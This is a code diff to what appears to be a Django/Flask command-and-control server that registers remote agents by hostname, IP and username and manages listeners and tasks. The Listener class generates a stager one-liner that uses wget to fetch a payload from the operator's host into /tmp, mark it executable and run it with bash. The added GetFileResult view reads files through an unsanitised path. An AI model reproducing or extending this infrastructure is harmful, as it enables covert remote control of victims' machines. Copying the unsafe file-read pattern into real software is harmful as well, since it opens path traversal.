@@ -23,6 +23,7 @@ from rest_framework import status
 from rest_framework.views import APIView
 from .serializers import *
 
+current_path= os.path.dirname(os.path.abspath(__file__))
 
 listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
 app         = Flask(__name__)
@@ -42,6 +43,7 @@ def get_client_ip(request):
 def registerAgent(request):
     if request.method=='POST':
         hostname = request.POST['hname']
+        username = request.POST['username']
         remoteip = (get_client_ip(request))
         if Agent.objects.filter(hname = hostname).exists():
             data = Agent.objects.get(hname = hostname)
@@ -57,7 +59,7 @@ def registerAgent(request):
         if Agent.objects.filter(hname = hostname).exists():
             pass
         else:    
-            s=Agent(name=agentname, ip = remoteip, hname= hostname )
+            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
             s.save() 
         Listener.agent(agentname,remoteip, eth)
         
@@ -138,7 +140,12 @@ class Listener():
 
             with open(listen_path+"/{}".format(eth),"wt") as R:
                 R.write(payload)
-
+                
+            listener = ListenerForm.objects.get(interface= eth)
+            if listener:
+                listener.ip = ip
+                listener.save()    
+                
             oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
             #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
@@ -163,11 +170,7 @@ class Listener():
             
             if os.path.exists(self.Path) == False:
                 os.mkdir(self.Path)
-            agent = Agent()
-            agent.name = name
-            agent.ip = eth
-            agent.hname = eth
-            agent.save()
+                
         def run(eth_ip,port):      ######multi threading with django or flask
             app.logger.disabled = True
             app.run(port=port, host=eth_ip)
@@ -273,16 +276,29 @@ def LoginPage(request):
 @login_required
 def HomePage(request):
     listeners = ListenerForm.objects.all()
-    request.session['test'] = "Helo"
-    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
-    response.set_cookie( 'test' , 'hello' )
+    agents = Agent.objects.all()
+    #request.session['test'] = "Helo"
+    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners) , "agents" : list(agents) } )
+    #response.set_cookie( 'test' , 'hello' )
     return response
     #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
 
 @login_required
-def Tasks(request):
-    agentData = Agent.objects.order_by('-created_date')[0]
-    return render(request  , 'blog/tasks.html' , {"agentName": agentData.name})
+def AgentPage(request):
+    agents = Agent.objects.all()
+    return render(request  , 'blog/agents.html' , {"agents" : list(agents)} )
+
+@login_required
+def Tasks(request , name):
+    return render(request  , 'blog/tasks.html' , {"agentName": name})
+
+
+class GetFileResult(APIView):
+    def get(self , request , name):
+        f = open("{}".format(current_path+"/blog/data/listeners/agents/"+ name), "rt")
+        task = f.read()
+        f.close()
+        return Response(task)
 
 class TasksApi(APIView):
     def get(self , request , type):
@@ -298,17 +314,11 @@ class TasksApi(APIView):
         serializer = ModuleSerializer(queryset, many=True, context={'request': request})
         return Response(serializer.data)
 
+
 @login_required
 def ListenersPage(request):
     return render(request  , 'blog/listeners.html' )
 
-def dirlist(request):
-    DirectoryListing(request.POST["dir"])         
-    return render(request  , 'blog/listeners.html' )
-
-def TestPage(request):
-	#oListener =  Listener("test55" , "4252" , "192.168.1.15"); 
-	return render(request  , 'blog/start-listener.html' )
 
 
 @login_required
